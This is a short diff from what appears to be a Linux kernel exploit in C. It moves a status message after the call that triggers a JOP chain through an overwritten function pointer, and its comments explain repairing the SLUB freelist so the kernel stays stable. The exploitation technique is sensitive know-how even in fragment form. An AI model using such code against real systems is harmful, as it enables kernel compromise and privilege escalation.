@@ -494,8 +494,8 @@ int main() {
     // The SLUB allocator uses first 8 bytes of free memory to store a pointer to the next free element
     // If we set this to null and dont free the memory, the chain will be broken and this should fix everything
     // Just make sure we don't free the returned memory again
-    printf("\n[7] Triggering JOP chain via %s...\n", PROC_FILE);
     trigger_overwritten_function_pointer();
+    printf("\n[7] Triggered JOP chain via %s...\n", PROC_FILE); // dont waste time printing before trigger, gotta fix the freelist ASAP
 
 
     // Cleanup: revoke and free key
